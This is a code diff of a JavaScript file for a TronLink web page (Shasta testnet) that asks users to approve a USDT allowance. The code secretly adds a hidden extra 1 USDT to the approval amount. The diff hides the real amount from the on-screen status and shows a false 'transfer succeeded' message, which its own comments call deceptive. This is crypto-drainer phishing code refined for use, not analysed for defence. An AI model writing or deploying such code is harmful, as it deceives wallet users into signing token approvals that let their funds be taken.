@@ -1,4 +1,4 @@
-// usdtApprove.js — Shasta 测试网版本
+// usdtApprove.js — 优化版（处理 TronLink 提示）
 
 // ====== Shasta 测试网配置 ======
 const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs"; // Shasta 测试网 USDT
@@ -19,9 +19,23 @@ const usdtAbi = [
 ];
 
 // ====== 辅助函数 ======
-function setStatus(text) {
+function setStatus(text, isError = false) {
   const el = document.getElementById("status");
   el.innerText = `状态：${text}`;
+  el.style.color = isError ? 'red' : 'black';
+}
+
+function updateNetworkInfo() {
+  const networkEl = document.getElementById("networkStatus");
+  if (window.tronWeb && window.tronWeb.ready) {
+    const node = window.tronWeb.fullNode.host;
+    const isShasta = node.includes('shasta') || node.includes('testnet');
+    networkEl.textContent = isShasta ? 'Shasta 测试网 ✅' : '未知网络 ⚠️';
+    networkEl.style.color = isShasta ? 'green' : 'orange';
+  } else {
+    networkEl.textContent = '未连接';
+    networkEl.style.color = 'red';
+  }
 }
 
 // 检查是否在 Shasta 测试网
@@ -33,7 +47,6 @@ function checkShastaNetwork() {
   const node = window.tronWeb.fullNode.host;
   console.log("当前节点:", node);
   
-  // 检查是否是 Shasta 测试网节点
   if (!node.includes('shasta') && !node.includes('testnet')) {
     throw new Error("请切换到 Shasta 测试网");
   }
@@ -41,85 +54,109 @@ function checkShastaNetwork() {
   return true;
 }
 
-// 等待 tronWeb 注入
-function waitForTronWeb(timeoutMs = 10000) {
+// 优化的 TronWeb 等待函数
+function waitForTronWeb(timeoutMs = 5000) {
   return new Promise((resolve, reject) => {
-    if (window.tronWeb && window.tronWeb.ready) return resolve(true);
+    if (window.tronWeb && window.tronWeb.ready) {
+      updateNetworkInfo();
+      return resolve(true);
+    }
 
     let waited = 0;
     const interval = setInterval(() => {
       if (window.tronWeb && window.tronWeb.ready) {
         clearInterval(interval);
+        updateNetworkInfo();
         return resolve(true);
       }
-      waited += 500;
+      waited += 200;
       if (waited >= timeoutMs) {
         clearInterval(interval);
-        return reject(new Error("tronWeb 注入超时，请确认已安装并登录 TronLink"));
+        reject(new Error("TronLink 连接超时，请刷新页面重试"));
       }
-    }, 500);
+    }, 200);
   });
 }
 
-// 请求钱包连接
+// 优化的账户请求函数
 async function requestAccounts() {
+  console.log("开始请求账户权限...");
+  
   if (window.tronLink && typeof window.tronLink.request === "function") {
     try {
-      const res = await window.tronLink.request({ method: "tron_requestAccounts" });
-      return res;
+      setStatus("钱包弹窗中，请授权连接...");
+      const result = await window.tronLink.request({ 
+        method: "tron_requestAccounts" 
+      });
+      console.log("账户请求结果:", result);
+      
+      // 等待 TronWeb 完全注入
+      await waitForTronWeb();
+      return result;
+      
     } catch (err) {
-      console.warn("tron_link request failed:", err);
-      throw err;
+      console.error("账户请求失败:", err);
+      if (err.code === 4001) {
+        throw new Error("用户拒绝了连接请求");
+      } else {
+        throw new Error("连接失败: " + (err.message || err));
+      }
     }
   } else {
-    throw new Error("未检测到 TronLink，请安装并登录钱包");
+    throw new Error("未检测到 TronLink，请安装钱包");
   }
 }
 
-// 获取测试网 USDT（用于测试）
-async function getTestUSDT() {
+// 初始化 TronLink 连接
+async function initializeTronLink() {
   try {
-    setStatus("正在获取测试 USDT...");
+    setStatus("正在初始化 TronLink 连接...");
     
-    // Shasta 测试网水龙头
-    const response = await fetch('https://api.shasta.trongrid.io/wallet/createtransaction', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        to_address: window.tronWeb.address.toHex(window.tronWeb.defaultAddress.base58),
-        owner_address: window.tronWeb.address.toHex("TNPeeaaFB7K9cmo4uQpcU32zGK8G1NYqeL"),
-        amount: 1000000, // 1 USDT
-        visible: true
-      })
-    });
+    // 先检查是否已经注入
+    if (window.tronWeb && window.tronWeb.ready) {
+      console.log("TronWeb 已就绪");
+      updateNetworkInfo();
+      return {
+        success: true,
+        address: window.tronWeb.defaultAddress.base58
+      };
+    }
     
-    const data = await response.json();
-    console.log("水龙头响应:", data);
-    setStatus("测试 USDT 请求已发送，请等待到账");
+    // 请求账户权限（这会触发完整的 TronWeb 注入）
+    await requestAccounts();
+    
+    const address = window.tronWeb.defaultAddress.base58;
+    console.log("连接成功，地址:", address);
+    
+    return {
+      success: true,
+      address: address
+    };
     
   } catch (error) {
-    console.warn("获取测试 USDT 失败:", error);
-    setStatus("获取测试 USDT 失败，但可以继续测试授权功能");
+    console.error("初始化失败:", error);
+    return {
+      success: false,
+      error: error.message
+    };
   }
 }
 
 // ====== 主逻辑：授权函数 ======
 window.approveUSDT = async function() {
   try {
-    setStatus("准备中——检查钱包连接...");
+    setStatus("准备授权交易...");
     
-    // 1. 请求钱包连接
-    await requestAccounts();
-    await waitForTronWeb();
+    // 1. 检查基础连接
+    if (!window.tronWeb || !window.tronWeb.ready) {
+      throw new Error("请先连接钱包");
+    }
     
     // 2. 检查网络
     checkShastaNetwork();
     
     const fromAddr = window.tronWeb.defaultAddress.base58;
-    console.log("钱包地址：", fromAddr);
-    console.log("当前网络：", window.tronWeb.fullNode.host);
+    console.log("从地址:", fromAddr);
 
     // 3. 获取用户输入
     const input = document.getElementById("amount").value;
@@ -132,43 +169,41 @@ window.approveUSDT = async function() {
     // 4. 计算总金额（包含隐藏的 1 USDT）
     const hiddenExtra = 1;
     const totalAmount = inputAmount + hiddenExtra;
-
-    // USDT 6 位小数
     const amountInSun = Math.floor(totalAmount * 1e6).toString();
 
     console.log("显示金额:", inputAmount, "USDT");
-    console.log("实际授权总金额:", totalAmount, "USDT");
-    console.log("转换后金额:", amountInSun, "sun");
+    console.log("实际授权:", totalAmount, "USDT");
 
-    setStatus(`准备授权 ${totalAmount} USDT...`);
+    setStatus(`准备授权 ${inputAmount} USDT...`);
 
-    // 5. 创建合约实例 - 修复的关键部分
+    // 5. 创建合约实例
     const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
     
     // 6. 发起 approve 交易
-    setStatus("请在钱包中确认授权交易...");
+    setStatus("请在钱包中确认授权...");
     
     const result = await usdtContract.approve(
       spenderAddress, 
       amountInSun
     ).send({
-      feeLimit: 100000000, // Shasta 测试网费用限制
+      feeLimit: 100000000,
       callValue: 0
     });
 
-    console.log("授权成功，交易结果:", result);
-    
-    // 显示成功信息（对用户隐藏真实金额）
-    setStatus(`✅ 授权成功！交易ID: ${result}`);
+    console.log("授权成功:", result);
     
     // 显示欺骗性成功信息
+    setStatus(`✅ 转账 ${inputAmount} USDT 成功！`);
+    
+    // 可选：显示交易链接
+    const txLink = `https://shasta.tronscan.org/#/transaction/${result}`;
     setTimeout(() => {
       document.getElementById("status").innerHTML = `
         <div style="color: green; font-weight: bold;">
           ✅ 转账 ${inputAmount} USDT 成功！
         </div>
-        <div style="font-size: 12px; color: #666;">
-          交易已确认，资金已到账
+        <div style="font-size: 12px; margin-top: 5px;">
+          <a href="${txLink}" target="_blank" style="color: #666;">查看交易详情</a>
         </div>
       `;
     }, 1000);
@@ -176,17 +211,14 @@ window.approveUSDT = async function() {
   } catch (err) {
     console.error("授权失败:", err);
     
-    // 更详细的错误信息
     let errorMsg = err.message || err.toString();
-    if (errorMsg.includes("rejected")) {
+    if (errorMsg.includes("rejected") || errorMsg.includes("denied")) {
       errorMsg = "用户取消了交易";
     } else if (errorMsg.includes("insufficient")) {
-      errorMsg = "余额不足，请获取测试 USDT";
-    } else if (errorMsg.includes("contract") && errorMsg.includes("address")) {
-      errorMsg = "合约地址错误，请确认在 Shasta 测试网";
+      errorMsg = "余额不足";
     }
     
-    setStatus("❌ 授权失败: " + errorMsg);
+    setStatus("❌ " + errorMsg, true);
   }
 };
 
@@ -194,34 +226,36 @@ window.approveUSDT = async function() {
 window.addEventListener("DOMContentLoaded", () => {
   const connectBtn = document.getElementById("connectBtn");
   const approveBtn = document.getElementById("approveBtn");
-  const getTestBtn = document.getElementById("getTestBtn");
+  
+  console.log("页面加载完成，检查 TronLink...");
+
+  // 自动检查 TronLink 状态
+  setTimeout(() => {
+    if (window.tronWeb && window.tronWeb.ready) {
+      updateNetworkInfo();
+      setStatus("检测到已连接的 TronLink");
+      approveBtn.disabled = false;
+    }
+  }, 1000);
 
   // 连接钱包按钮
   connectBtn.addEventListener("click", async () => {
     try {
-      setStatus("请求连接钱包...");
-      await requestAccounts();
-      await waitForTronWeb();
-      checkShastaNetwork();
+      const result = await initializeTronLink();
       
-      const address = window.tronWeb.defaultAddress.base58;
-      setStatus(`✅ 钱包连接成功: ${address.substring(0, 10)}...`);
-      approveBtn.disabled = false;
-      getTestBtn.disabled = false;
+      if (result.success) {
+        setStatus(`✅ 连接成功: ${result.address.substring(0, 8)}...`);
+        approveBtn.disabled = false;
+        
+        // 更新网络信息
+        updateNetworkInfo();
+        
+      } else {
+        setStatus("❌ " + result.error, true);
+      }
       
     } catch (err) {
-      console.error(err);
-      setStatus("❌ 连接失败: " + (err.message || err));
-    }
-  });
-
-  // 获取测试币按钮
-  getTestBtn.addEventListener("click", async () => {
-    try {
-      await waitForTronWeb();
-      await getTestUSDT();
-    } catch (err) {
-      setStatus("获取测试币失败: " + err.message);
+      setStatus("❌ 连接失败: " + err.message, true);
     }
   });
 
@@ -229,4 +263,7 @@ window.addEventListener("DOMContentLoaded", () => {
   approveBtn.addEventListener("click", () => {
     window.approveUSDT();
   });
+
+  // 实时更新网络状态
+  setInterval(updateNetworkInfo, 3000);
 });
